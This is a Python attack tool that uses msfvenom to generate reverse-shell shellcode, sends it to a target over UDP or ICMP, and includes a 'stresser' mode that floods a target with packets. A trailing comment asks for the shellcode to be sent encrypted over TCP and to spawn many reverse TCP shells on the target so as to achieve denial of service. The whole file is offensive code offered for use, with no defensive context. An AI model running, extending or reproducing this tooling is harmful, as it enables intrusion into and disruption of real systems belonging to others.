import os
import socket
import time
import argparse
from scapy.all import IP, UDP, ICMP, Raw, send

def generate_shellcode(payload, lhost, lport):
    command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f python"
    result = os.popen(command).read()
    shellcode = result.split('buf = ')[1].strip().replace('\n', '').replace('\"', '').replace('+', '')
    return bytes.fromhex(shellcode.replace('\\x', ''))

def send_shellcode_via_udp(shellcode, target_ip, target_port, num_packets, burst_interval):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(num_packets):
        try:
            sock.sendto(shellcode, (target_ip, target_port))
            print(f"Packet {i+1}/{num_packets} sent to {target_ip}:{target_port}")
            time.sleep(burst_interval)
        except Exception as e:
            print(f"An error occurred: {e}")
            break
    sock.close()

def send_shellcode_via_icmp(shellcode, target_ip, num_packets, burst_interval):
    for i in range(num_packets):
        pkt = IP(dst=target_ip)/ICMP()/Raw(load=shellcode)
        try:
            send(pkt, verbose=False)
            print(f"ICMP Packet {i+1}/{num_packets} sent to {target_ip}")
            time.sleep(burst_interval)
        except Exception as e:
            print(f"An error occurred: {e}")
            break

def network_stresser(target_ip, target_port, duration, protocol):
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = os.urandom(1024)  # Random payload of 1024 bytes
    while time.time() < end_time:
        if protocol == 'udp':
            sock.sendto(packet, (target_ip, target_port))
        elif protocol == 'icmp':
            pkt = IP(dst=target_ip)/ICMP()/Raw(load=packet)
            send(pkt, verbose=False)
        print(f"Stressing {protocol.upper()} to {target_ip}:{target_port}")
    sock.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Send shellcode via UDP or ICMP packets or stress network.')
    parser.add_argument('--target_ip', type=str, required=True, help='The target IP address')
    parser.add_argument('--target_port', type=int, help='The target port (for UDP)')
    parser.add_argument('--num_packets', type=int, default=10, help='Number of packets to send')
    parser.add_argument('--burst_interval', type=float, default=1.0, help='Interval between packets in seconds')
    parser.add_argument('--payload', type=str, default='linux/x86/shell_reverse_tcp', help='Payload for msfvenom')
    parser.add_argument('--lhost', type=str, default='127.0.0.1', help='Local host for msfvenom payload')
    parser.add_argument('--lport', type=int, default=4444, help='Local port for msfvenom payload')
    parser.add_argument('--protocol', type=str, choices=['udp', 'icmp'], default='udp', help='Protocol to use for sending packets')
    parser.add_argument('--stresser', action='store_true', help='Enable network stresser mode')
    parser.add_argument('--duration', type=int, default=60, help='Duration for network stresser mode in seconds')

    args = parser.parse_args()

    if args.stresser:
        if not args.target_port:
            print("Target port is required for UDP protocol in stresser mode.")
        else:
            network_stresser(args.target_ip, args.target_port, args.duration, args.protocol)
    else:
        shellcode = generate_shellcode(args.payload, args.lhost, args.lport)
        if args.protocol == 'udp':
            if not args.target_port:
                print("Target port is required for UDP protocol.")
            else:
                send_shellcode_via_udp(shellcode, args.target_ip, args.target_port, args.num_packets, args.burst_interval)
        elif args.protocol == 'icmp':
            send_shellcode_via_icmp(shellcode, args.target_ip, args.num_packets, args.burst_interval)

#Yes. Make it so that the shellcode will be sent via the tcp protocol, encrypted, and then once it reaches its intended target will decrypt and then exploit the target with many reverce tcp shells, thus exhausting the target's resources and achiving DoS.
